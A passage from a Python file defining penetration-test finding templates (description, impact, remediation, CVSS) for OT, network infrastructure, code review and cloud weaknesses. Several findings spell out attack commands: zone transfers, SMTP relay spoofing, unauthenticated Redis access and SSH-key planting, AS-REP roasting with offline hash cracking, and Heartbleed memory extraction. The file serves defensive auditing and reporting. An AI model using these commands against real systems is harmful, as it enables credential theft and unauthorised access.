            remediation="- Network segmentation: PLC management ports unreachable from anywhere outside the engineering VLAN; enforced with a layer-3/4 firewall, not just VLAN trunking.\n- Deploy a unidirectional gateway (data diode) between IT and the OT network for telemetry-only flows.\n- Where the protocol supports it (DNP3 SAv5, OPC UA), enable authentication AND replay-protection.\n- Continuous monitoring with an ICS-aware IDS (Claroty, Nozomi, Dragos) that detects anomalous control-plane commands.",
            references="https://www.cisa.gov/news-events/ics-advisories\nhttps://attack.mitre.org/matrices/ics/\nhttps://cwe.mitre.org/data/definitions/306.html",
            cwe="CWE-306",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:H/SC:N/SI:H/SA:H"),

        _f("ot_vapt", "PLC / RTU / HMI Running on Default Credentials", "Critical",
            description="The HMI's engineering port accepts the vendor default (`admin/admin`, `engineer/0000`, `siemens/siemens`). The same is true for the underlying PLC's web interface (Schneider M340, Rockwell ControlLogix, Siemens S7-1200), and the workstation's RDP password.",
            impact="Direct administrative control of the SCADA system without effort. Once an attacker is inside the OT network (via a phishing pivot, an exposed VPN, or a vendor's remote-support tunnel), default credentials collapse the rest of the security model to zero.",
            remediation="- Change every vendor default credential as the first step of commissioning. Document changes in the deployment runbook so vendor refreshes don't reset them.\n- Where the device only supports a fixed default user, isolate it network-wise and proxy any access through a privileged-access management station (CyberArk PAM, Wallix).\n- Plan for hardware refresh of devices that don't support secure credential management.",
            references="https://www.cisa.gov/sites/default/files/2024-01/Strategies%20to%20Help%20Protect%20Critical%20Infrastructure%20Against%20the%20Threats%20Posed%20by%20Default%20Passwords%20FactSheet.pdf",
            cwe="CWE-1392",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"),

        _f("ot_vapt", "Engineering Workstation Exposed to Corporate / Internet Networks", "High",
            description="The engineering workstation (the machine running Step7, ControlLogix Studio 5000, Wonderware) is on the same flat VLAN as office laptops AND can reach the Internet directly via the corporate proxy. It runs Windows 7 / Server 2008 R2 (vendor-locked).",
            impact="Phishing the engineering workstation's user is a single click away from full OT compromise. Stuxnet propagated through engineering workstations. Industroyer's 2016 Ukraine attack reached the substation HMI via this exact chain.",
            remediation="- Isolate engineering workstations behind a dedicated jump host / privileged-access management bastion (Purdue Level 3 → Level 2 boundary).\n- Block direct Internet egress; whitelist exactly the vendor update domains needed.\n- USB / removable media policy: scan-and-strip via a sheep-dip station before insertion.\n- Where the underlying OS is end-of-life, run the engineering app inside an isolated Hyper-V / VMware guest with limited host access.",
            references="https://www.cisa.gov/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf",
            cwe="CWE-284",
            cvss_score=8.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"),

        _f("ot_vapt", "Unencrypted Vendor Remote-Support Tunnel Always-On", "High",
            description="The PLC vendor's support modem / cellular gateway / TeamViewer client is permanently on, with a single shared credential known to dozens of vendor field engineers. Connections are unlogged at the customer side. There is no MFA.",
            impact="Any vendor employee — past or present — has remote access to safety-critical systems without per-session approval. Multiple historical OT incidents started from a former-employee's persistent vendor-tunnel access.",
            remediation="- Replace always-on vendor tunnels with on-demand, time-limited, MFA-protected access through a PAM bastion. The customer enables the session, the vendor authenticates with MFA, the session is recorded.\n- Rotate any shared credential to per-user accounts.\n- Audit the bastion's session recordings monthly.",
            references="https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138a",
            cwe="CWE-287",
            cvss_score=8.1,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N"),

        _f("ot_vapt", "End-of-Life ICS Firmware With Known CVEs", "High",
            description="Multiple PLCs run firmware versions affected by published advisories: Siemens S7-1500 firmware < V2.9 (CVE-2021-37185 unauthenticated DoS), Schneider Modicon M340 firmware <= V3.30 (CVE-2018-7842 unauthenticated firmware upload), Rockwell ControlLogix 1756-L7x v32 (CVE-2022-1161 logic injection).",
            impact="Public exploits exist for several of the flagged CVEs and require only network reachability to the PLC. The asset-owner risk depends on the specific advisory but typically includes RCE, denial of service, or unauthorised firmware replacement.",
            remediation="- Plan a controlled firmware-update window in coordination with operations. Have a tested rollback path.\n- Where update isn't possible short-term, compensating controls: deeper segmentation, ICS-IDS alerting on the specific CVE's traffic pattern, allow-listing the source IPs that legitimately speak the affected protocol.\n- Subscribe to vendor ICS-CERT advisory feeds and treat them with the same SLO as IT-side CVEs.",
            references="https://www.cisa.gov/news-events/ics-advisories",
            cwe="CWE-1104",
            cvss_score=8.0,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),
    ])

    # ---- Infrastructure (DNS / Mail / TLS / Services) ---------------
    F.extend([
        _f("infra_vapt", "DNS Zone Transfer (AXFR) Allowed to Untrusted Hosts", "Medium",
            description="`dig @<ns> example.com AXFR` returns the full DNS zone — every host, every CNAME, every TXT record (including the SPF / DMARC entries that reveal mail-routing topology). The audited DNS server permits AXFR from any source IP.",
            impact="Complete map of the organisation's internal hostname taxonomy: dev/staging/uat hostnames, internal mail relays, VPN endpoints, vendor integrations. Attackers use this as a feeder for the rest of the engagement (forced browsing, subdomain takeover, targeted phishing).",
            remediation="- Restrict AXFR to authorised secondary nameservers only — by IP allow-list (`allow-transfer { 198.51.100.10; };` BIND) and/or by TSIG-signed transfers.\n- Better: split-horizon DNS — internal hostnames live on an internal-only DNS server unreachable from the Internet.\n- Audit periodically with `dig @<ns> <zone> AXFR` from an external probe.",
            references="https://cwe.mitre.org/data/definitions/200.html\nhttps://www.iana.org/assignments/dns-parameters",
            cwe="CWE-200",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Missing SPF / DKIM / DMARC Records", "Medium",
            description="The audited domain has no `v=spf1`, no DKIM selector, and no `_dmarc` record (or DMARC is set to `p=none` with no reporting address). External mail receivers (Gmail, Microsoft 365, ProtonMail) cannot reliably reject mail spoofing `From: <user>@example.com`.",
            impact="Direct enabler for phishing campaigns: an attacker spoofs internal-looking sender addresses and the messages land in the inbox (no SPF/DMARC fail). For high-profile organisations this is a recurring incident cause.",
            remediation="- Publish `v=spf1 mx include:_spf.example.com -all` covering the legitimate sending IPs.\n- Sign outbound mail with DKIM via the SMTP gateway (1024-bit minimum; prefer 2048).\n- Publish `_dmarc.example.com TXT: v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com; ruf=mailto:...` once SPF/DKIM are stable. Progress p=none → quarantine → reject in monitored steps.\n- Subscribe to the aggregate-reports (`rua`) feed and tune SPF/DKIM until legitimate mail stops being rejected.",
            references="https://datatracker.ietf.org/doc/html/rfc7208\nhttps://datatracker.ietf.org/doc/html/rfc7489",
            cwe="CWE-358",
            cvss_score=6.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "SMTP Open Relay", "High",
            description="The mail server accepts and relays mail from an arbitrary external IP to an arbitrary external recipient without authentication. Verified via `swaks --to victim@external.tld --from spoofed@example.com --server <mta>` — the message delivers.",
            impact="The MTA is used by spam / phishing operators to send mail on behalf of the organisation's domain. The IP gets blacklisted (DNSBL listings), legitimate outbound mail starts being rejected by receivers, and the organisation's reputation suffers.",
            remediation="- Restrict relaying to authenticated users only (`smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination` for Postfix).\n- Disable EXPN, VRFY, and RCPT-time recipient enumeration.\n- Block port 25 outbound from non-MTA hosts at the perimeter firewall.",
            references="https://www.spamhaus.org/whitepapers/effective_anti-abuse_for_isps/\nhttps://cwe.mitre.org/data/definitions/269.html",
            cwe="CWE-269",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:L/SI:L/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "TLS — Known Vulnerable Cipher Suite (Sweet32 / BEAST / FREAK / POODLE)", "Medium",
            description="`testssl.sh` / `nmap --script ssl-enum-ciphers` reports the host accepts at least one of the following: 3DES (Sweet32, CVE-2016-2183), RC4 (Bar Mitzvah / RFC 7465), EXPORT-grade RSA (FREAK, CVE-2015-0204), or SSLv3 (POODLE, CVE-2014-3566). TLS_RSA_* cipher suites without forward secrecy are also accepted.",
            impact="Each of the named vulnerabilities has a specific cryptographic weakness — Sweet32 enables decryption of long-running TLS streams over 3DES; POODLE allows plaintext recovery on SSLv3; FREAK downgrades to 512-bit RSA. None requires application-layer access; the network position alone is sufficient.",
            remediation="- Restrict the cipher suite list to TLS 1.2 / 1.3 with PFS-only suites: ECDHE-ECDSA / ECDHE-RSA with AEAD (AES-GCM, ChaCha20-Poly1305).\n- Disable SSLv2/v3, TLS 1.0/1.1, 3DES, RC4, EXPORT, NULL, anonymous ciphers.\n- Use the Mozilla SSL Configuration Generator for current recommended configs (intermediate or modern profile).\n- Re-test with `testssl.sh -t https <host>` after applying.",
            references="https://wiki.mozilla.org/Security/Server_Side_TLS\nhttps://www.ssllabs.com/ssltest/",
            cwe="CWE-327",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "web_vapt"]),

        _f("infra_vapt", "TLS Heartbleed (CVE-2014-0160) Still Present", "Critical",
            description="The host runs an OpenSSL version vulnerable to Heartbleed and has the heartbeat extension enabled. `nmap --script ssl-heartbleed -p 443 <host>` confirms; a Metasploit / custom client extracts 64 KiB chunks of process memory per request.",
            impact="Memory extraction yields private keys, session cookies, post-login form data, and any other content the OpenSSL process touched. Discovery in 2014, but residual vulnerable hosts still appear in scans of long-tail infrastructure.",
            remediation="- Update OpenSSL to ≥ 1.0.1g and rotate the affected TLS private keys + every credential / session token that may have been in memory.\n- Re-issue server certificates with new private keys; revoke the old ones via the CA.\n- Force-rotate user passwords if leak-of-credential is plausible.",
            references="https://heartbleed.com/\nhttps://nvd.nist.gov/vuln/detail/CVE-2014-0160",
            cwe="CWE-1104",
            cvss_score=9.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:H/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "ICMP Timestamp / Netmask Replies Enabled", "Informational",
            description="The audited host replies to ICMP type 13 (Timestamp Request) and type 17 (Address Mask Request). The timestamp reveals the host's local clock with millisecond precision; in combination with the netmask reply this can fingerprint OS and infer time-zone / domain placement.",
            impact="Pure information disclosure. No direct exploitation, but supplies reconnaissance data to a targeted attacker.",
            remediation="- Block ICMP types 13 and 17 at the host firewall (`iptables -A INPUT -p icmp --icmp-type timestamp-request -j DROP`) or at the perimeter.\n- On Linux: `net.ipv4.icmp_echo_ignore_broadcasts=1` and limit ICMP overall via firewall.\n- Documentation-only: many automated scanners flag this — fix it for cleaner scan output even if low-priority.",
            references="https://www.openwall.com/lists/oss-security/2019/12/03/2",
            cwe="CWE-200",
            cvss_score=0.0,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Anonymous FTP Login Permitted", "Medium",
            description="`ftp <host>` accepts `anonymous` / any-password and grants read access to `/pub` or `/`. Directory walk yields backup archives, build artefacts, configuration samples — some containing credentials.",
            impact="Information disclosure scaled with whatever the FTP root contained. Where the share is writable, this becomes a malware-hosting platform on the organisation's IP.",
            remediation="- Disable anonymous FTP unless it's an explicit, monitored content-distribution surface.\n- Migrate to SFTP / HTTPS for any internal file-sharing use case.\n- If anonymous FTP must remain, chroot to a dedicated empty directory and audit the directory contents weekly.",
            references="https://datatracker.ietf.org/doc/html/rfc1635",
            cwe="CWE-284",
            cvss_score=5.4,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Unauthenticated Redis / Memcached / Elasticsearch on Network", "Critical",
            description="Port 6379 (Redis) / 11211 (Memcached) / 9200 (Elasticsearch) is reachable on the network with no authentication. `redis-cli -h <host>` returns a working shell; `KEYS *` enumerates every key including any session tokens / cached credentials the application stores there. On Elasticsearch, `GET /_cat/indices?v` and `GET /<index>/_search?q=*` return everything.",
            impact="Direct data exfiltration plus, on Redis, write-access to any value the application uses for authorisation. Several historical Redis-on-internet incidents resulted in full server compromise via `CONFIG SET dir` + `SAVE` to write authorised SSH keys.",
            remediation="- Bind these services to `127.0.0.1` or to the application-tier subnet only. Firewall the port at the host level as defence in depth.\n- Enable authentication: Redis `requirepass` (≥ 20-char random), Memcached SASL, Elasticsearch built-in security (X-Pack).\n- Disable dangerous Redis commands in production via `rename-command CONFIG \"\"` / `FLUSHALL \"\"`.\n- Run periodic Internet-side scans to confirm none of these ports are exposed.",
            references="https://redis.io/docs/management/security/\nhttps://www.elastic.co/guide/en/elasticsearch/reference/current/security-minimal-setup.html",
            cwe="CWE-306",
            cvss_score=9.3,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"),

        _f("infra_vapt", "Insecure Network File Share — Anonymous SMB", "High",
            description="`smbclient -L <host> -N` (no password) lists shared resources; one or more shares are readable as the `Guest` / null-session user. Recursive copy yields files including HR documents, financial worksheets, and an `IT/credentials.xlsx` spreadsheet.",
            impact="Data exposure of every file on the affected shares to anyone with network reachability. Internal-network compromise typically pivots through findings like this within the first hours.",
            remediation="- Disable null-session / anonymous SMB access globally on Windows file servers (`Network access: Restrict anonymous access to Named Pipes and Shares = Enabled`).\n- Audit every share's NTFS + share permissions; remove `Everyone:Read` / `Guest:Read`.\n- Enable SMB signing and SMB encryption for the shares carrying sensitive content.",
            references="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-anonymous-access-to-named-pipes-and-shares",
            cwe="CWE-284",
            cvss_score=7.5,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["infra_va", "ot_vapt"]),

        _f("infra_vapt", "Active Directory — Pre-Authentication Disabled (AS-REP Roasting)", "High",
            description="One or more domain user accounts have `Do not require Kerberos pre-authentication` set in their account control flags. `GetNPUsers.py -dc-ip <dc> -no-pass example.local/` returns AS-REP responses containing the user's encrypted timestamp; hashcat mode 18200 cracks the hash offline.",
            impact="Any account flagged for no-pre-auth yields its password hash to an unauthenticated network attacker. Service accounts left in this state — often because of an old NetWare / non-Windows client requirement — frequently have stale, weak, or never-rotated passwords.",
            remediation="- Audit `userAccountControl` for `DONT_REQ_PREAUTH` (0x400000) and clear it from any account that doesn't legitimately need it.\n- Where the flag must remain (legacy client), assign a 25-char random password and rotate it as part of routine SOP.\n- Detect: SIEM rule on `Event ID 4768` with `Ticket Encryption Type 0x17` (RC4) AND `Pre-authentication Type 0`.",
            references="https://attack.mitre.org/techniques/T1558/004/",
            cwe="CWE-287",
            cvss_score=8.0,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"),
    ])

    # ---- Source Code Review (deeper coverage) ----------------------
    F.extend([
        _f("source_code_review", "Use of Inherently Dangerous C Functions (strcpy, gets, sprintf)", "High",
            description="A grep of the C/C++ codebase surfaces uses of `strcpy`, `strcat`, `gets`, `sprintf`, `vsprintf` operating on caller-controlled lengths. Example sink: `char buf[256]; strcpy(buf, env_var);` — when `env_var` exceeds 255 bytes, the stack is corrupted.",
            impact="Stack-based buffer overflow, frequently exploitable for RCE on platforms without canary / W^X / ASLR coverage. Even with modern mitigations, every overflow is at minimum a reliable denial-of-service vector and often a discovery aid for adjacent bugs.",
            remediation="- Replace with bounded variants (`strncpy_s`, `strlcpy`, `snprintf`).\n- Compile with `-fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wformat -Wformat-security`.\n- Enable ASLR, NX, and (where applicable) Control Flow Integrity (`-fsanitize=cfi`).\n- Where a legacy API must remain, wrap it in a length-checking shim and lint-ban direct calls.",
            references="https://cwe.mitre.org/data/definitions/242.html\nhttps://cwe.mitre.org/data/definitions/120.html",
            cwe="CWE-242",
            cvss_score=8.4,
            cvss_vector="CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["thick_client_pt"]),

        _f("source_code_review", "Integer Overflow / Underflow in Allocation Math", "High",
            description="Allocation size is computed by multiplying two attacker-influenced 32-bit integers without checking for overflow: `void *p = malloc(n * sizeof(record_t));`. When `n` is large enough the multiplication wraps to a small value; the subsequent loop writes far past the actual allocation.",
            impact="Heap corruption with attacker-controlled length — frequently exploitable into RCE via heap-feng-shui techniques. Same primitive in the kernel/driver space yields privilege escalation.",
            remediation="- Use overflow-checking arithmetic (`__builtin_mul_overflow`, `std::numeric_limits`, Rust's `checked_mul`).\n- For allocation specifically, prefer `calloc(n, sizeof(t))` (the libc implementation MUST overflow-check per POSIX).\n- Validate `n` against a sane upper bound before the allocation.",
            references="https://cwe.mitre.org/data/definitions/190.html",
            cwe="CWE-190",
            cvss_score=8.2,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            extra_templates=["thick_client_pt"]),

        _f("source_code_review", "Use of Weak Cryptographic Hash (MD5 / SHA-1)", "Medium",
            description="The application stores password hashes using MD5 or unsalted SHA-1. Code reads:\n```python\nhashlib.md5(password.encode()).hexdigest()\n```\nIn other modules MD5 is used to verify integrity of downloaded files / signed tokens.",
            impact="MD5 collisions are practical on a single workstation; SHA-1 collisions are practical with cloud GPU compute. For password storage, GPU rigs crack unsalted MD5 at hundreds of billions of attempts per second. For integrity / signature use, two distinct files can be crafted to share a hash — bypassing tamper detection.",
            remediation="- For password storage, switch to a memory-hard KDF: Argon2id (preferred), scrypt, or bcrypt with cost ≥ 12. Add a per-record random 16-byte salt.\n- For integrity / signatures, use SHA-256 minimum (SHA-3 / BLAKE2 / BLAKE3 for new builds).\n- Add a forced-rehash on next login to migrate existing MD5/SHA-1 password hashes silently.",
            references="https://cwe.mitre.org/data/definitions/327.html\nhttps://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
            cwe="CWE-327",
            cvss_score=6.8,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N",
            extra_templates=["web_vapt", "api_vapt"]),

        _f("source_code_review", "AES in ECB Mode", "Medium",
            description="`Cipher.getInstance(\"AES/ECB/PKCS5Padding\")` (Java), `EVP_aes_256_ecb()` (C), or `from Crypto.Cipher import AES; AES.new(key, AES.MODE_ECB)` (Python pycryptodome) is in use for encrypting application-level data. The ECB ciphertext exhibits the well-known \"Tux penguin\" pattern preservation — identical plaintext blocks produce identical ciphertext blocks.",
            impact="Attackers can identify duplicate plaintext blocks, infer record boundaries, and chosen-plaintext-attack the encryption layer to recover specific fields. For records like `session_id || user_id || role`, an attacker who knows one user's ciphertext can rearrange blocks across records.",
            remediation="- Switch to an AEAD mode: AES-GCM (preferred for performance), AES-GCM-SIV (nonce-misuse-resistant), or ChaCha20-Poly1305.\n- Generate a fresh random nonce / IV per encryption.\n- For at-rest field encryption, use envelope encryption with a per-record DEK.",
            references="https://cwe.mitre.org/data/definitions/327.html\nhttps://cryptopals.com/sets/2/challenges/12",
            cwe="CWE-327",
            cvss_score=5.7,
            cvss_vector="CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("source_code_review", "TOCTOU Race Condition on Filesystem Check", "Medium",
            description="The code does `if os.path.exists(path) and is_safe_path(path): open(path)` — between the `is_safe_path` check and the `open`, an attacker symlinks the path to a privileged file. The check passes against the original target; the `open` follows the link to `/etc/shadow`.",
            impact="Privilege escalation / arbitrary file access. The primitive shows up in setuid binaries (kernel-side privilege grant) and in privileged daemons that operate on user-owned paths.",
            remediation="- Use the file-descriptor-based `*at` API family: `openat(dirfd, ...)`, `fstatat`, etc. The check and the action operate on the same kernel object.\n- On Linux, `O_NOFOLLOW` rejects symlinks at the open call.\n- For language-level APIs, perform the open first, then call `fstat` on the resulting descriptor — never re-resolve the path.",
            references="https://cwe.mitre.org/data/definitions/367.html",
            cwe="CWE-367",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["thick_client_pt"]),

        _f("source_code_review", "Improper Certificate Validation in HTTP Client", "High",
            description="Multiple outbound HTTP clients in the codebase disable TLS certificate verification: `requests.get(url, verify=False)`, `OkHttpClient.Builder().hostnameVerifier((h, s) -> true)`, `ServicePointManager.ServerCertificateValidationCallback = (s,c,ch,e) => true`. Often used as a \"quick fix\" for staging environments and left in production.",
            impact="Every outbound HTTPS call is MitM-able by anyone on the network path. If those calls carry credentials / API keys / sensitive data, an attacker captures and replays them.",
            remediation="- Remove `verify=False` / hostname-verifier overrides from production code paths.\n- Use environment-specific CA bundles (corporate root CA included only on internal machines).\n- Where a self-signed staging cert is the issue, generate a proper internal CA and trust it system-wide rather than disabling verification.",
            references="https://cwe.mitre.org/data/definitions/295.html",
            cwe="CWE-295",
            cvss_score=7.7,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N",
            extra_templates=["web_vapt"]),

        _f("source_code_review", "Improper Input Validation — Missing Server-Side Length / Type Check", "Medium",
            description="Backend handlers accept request fields without per-field length / type / range validation. `POST /api/profile` accepts a `bio` field of any length — submitting 50 MiB of text causes the underlying ORM to balloon DB row size and the JSON serializer to OOM the response path. Numeric fields like `quantity` accept negative values, leading to balance underflow.",
            impact="Denial of service via resource exhaustion + business-logic bypass via out-of-range values. Both happen at the edge of \"works in practice\" testing.",
            remediation="- Define a typed DTO / Pydantic model / JSON-schema for every request handler. Enforce length, type, regex, and range constraints at the boundary.\n- Reject the request with a 400 explaining which field violated which constraint.\n- Cap aggregate request body size at the gateway (typical: 1 MiB for JSON APIs, larger only for endpoints that genuinely need it).",
            references="https://cwe.mitre.org/data/definitions/20.html",
            cwe="CWE-20",
            cvss_score=5.7,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N"),
    ])

    # ---- Cloud — additional AWS / Azure / GCP ----------------------
    F.extend([
        _f("aws_cloud_vapt", "GuardDuty / Security Hub Disabled or Coverage Gap", "Medium",
            description="Amazon GuardDuty is disabled in one or more active regions, or is enabled but with several feature classes (Malware Protection, EKS Audit Logs, RDS Login Events) explicitly turned off. Security Hub is not aggregated to a central administrator account.",
            impact="Detection blind-spot: known-bad signals (cryptomining EC2 traffic, anomalous IAM activity, leaked credentials being used) trigger no alerts. Incidents go undetected until the bill or a downstream consequence forces investigation.",
            remediation="- Enable GuardDuty in every region the account uses (including regions with no current workload — attackers often pivot to dormant regions to mine).\n- Turn on all GuardDuty features that align with the workload (Malware Protection for EC2/EBS, EKS Audit Logs, RDS, Lambda, S3).\n- Aggregate findings into Security Hub under a delegated administrator account.\n- Route HIGH/CRITICAL findings to a SOC pager via EventBridge → SNS.",
            references="https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html",
            cwe="CWE-778",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"),

        _f("aws_cloud_vapt", "VPC Flow Logs Disabled", "Medium",
            description="One or more VPCs have no Flow Logs configured. There is no record of allowed / denied network connections at the ENI / subnet / VPC level.",
            impact="Post-incident network forensics is impossible — there's no source of truth for \"what talked to what\" inside the VPC. Compromised instances communicating with C2 servers leave no trace.",
            remediation="- Enable VPC Flow Logs at the VPC level for every active VPC, sending to a centralised S3 bucket with KMS encryption.\n- Apply an SCP that prevents VPC creation without Flow Logs (use AWS Config remediation).\n- Retain ≥ 90 days online and longer in deep archive for compliance.\n- Build at least one detection rule on the logs (e.g. anomalous outbound bandwidth from an instance).",
            references="https://docs.aws.amazon.com/vpc/latest/userguide/flow-logs.html",
            cwe="CWE-778",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"),

        _f("aws_cloud_vapt", "AWS Config Disabled or Missing Coverage", "Medium",
            description="AWS Config is disabled, OR enabled with a recorder that excludes one or more resource types (most commonly: IAM, KMS, Lambda). No conformance pack is in use; no remediation actions are configured.",
            impact="Configuration-drift detection is blind. Misconfigurations introduced by manual console changes, by Terraform breakage, or by attacker activity (new admin IAM user) go unnoticed.",
            remediation="- Enable AWS Config in every region with `recordAllSupported: true`, `includeGlobalResourceTypes: true`.\n- Subscribe to the AWS Foundational Security Best Practices conformance pack.\n- Configure automatic remediation for HIGH-impact rules (e.g. public S3 bucket → block public access).\n- Route NON-COMPLIANT findings through EventBridge → SOC.",
            references="https://docs.aws.amazon.com/config/latest/developerguide/WhatIsConfig.html",
            cwe="CWE-778",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N"),

        _f("aws_cloud_vapt", "RDS Storage Encryption at Rest Disabled", "Medium",
            description="One or more RDS instances have `StorageEncrypted: false`. Underlying EBS volumes and automated snapshots are stored unencrypted.",
            impact="Sensitive data in the database is unencrypted on the storage layer. A snapshot copied across accounts (or accidentally made public) is fully readable. EBS-snapshot exfil is a documented attacker technique against AWS environments.",
            remediation="- Create a new encrypted RDS instance from a snapshot of the unencrypted one; migrate the application's writes; retire the old instance. (RDS does not support enabling encryption in-place.)\n- Use a customer-managed KMS key so access is auditable.\n- Apply a Config rule (`rds-storage-encrypted`) that flags any new unencrypted instance.",
            references="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html",
            cwe="CWE-311",
            cvss_score=5.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"),

        _f("aws_cloud_vapt", "ECR Image Scanning Disabled / Known-Vulnerable Container Images", "Medium",
            description="ECR `scanOnPush` is disabled on one or more repositories. Manual scans (or external scanners like Trivy / Snyk) reveal images running in production that contain CRITICAL-severity OS package CVEs (Log4Shell, OpenSSL, Spring4Shell, etc.).",
            impact="Vulnerable containers go to production unnoticed. The CVE-laden image inherits whatever IAM role its tasks assume — including potentially KMS-decrypt, S3-read on sensitive buckets, RDS access.",
            remediation="- Enable `scanOnPush` on every repository.\n- Subscribe to ECR enhanced scanning (Inspector v2) for continuous scanning of in-use images.\n- Block deployment of images with HIGH+ findings via a deploy-pipeline gate.\n- Rebuild and redeploy the base image on a regular cadence (weekly minimum for Internet-facing workloads).",
            references="https://docs.aws.amazon.com/AmazonECR/latest/userguide/image-scanning.html",
            cwe="CWE-1104",
            cvss_score=6.5,
            cvss_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N"),

        _f("azure_cloud_vapt", "Azure SQL — TLS Enforcement Not Required", "Medium",
            description="The Azure SQL logical server has `Minimum TLS version` set to `1.0` (or `<None>`). Clients can connect over TLS 1.0 / 1.1 — versions long deprecated and known-vulnerable (POODLE / BEAST / Sweet32 / FREAK risk on the negotiated suites).",
            impact="MitM-capable attacker on the network path can downgrade the connection and read query traffic in cleartext, including authentication tokens.",
            remediation="- Set `Minimum TLS Version` to `1.2` on every Azure SQL logical server.\n- Apply Azure Policy `Audit SQL Server with TLS version less than 1.2` for ongoing enforcement.\n- Verify with `Test-NetConnection` from a client and confirm only TLS 1.2/1.3 is offered.",
            references="https://learn.microsoft.com/en-us/azure/azure-sql/database/connectivity-settings",
            cwe="CWE-319",
            cvss_score=5.9,
            cvss_vector="CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N"),

        _f("azure_cloud_vapt", "Azure VM Disk Encryption Disabled", "Medium",
            description="One or more Azure VMs run with platform-managed-keys (PMK) at the storage layer only — the underlying disk is encrypted at rest by Azure but the OS / data disks are NOT encrypted with Azure Disk Encryption (BitLocker for Windows, dm-crypt for Linux) backed by Key Vault.",
            impact="Data-at-rest is opaque only to Azure infrastructure — not to anyone with a copy of the underlying disk image (snapshot leak, cross-tenancy export, vendor-side compromise). Several compliance regimes (PCI-DSS, HIPAA, ISO 27018) require customer-managed key material in addition to platform encryption.",
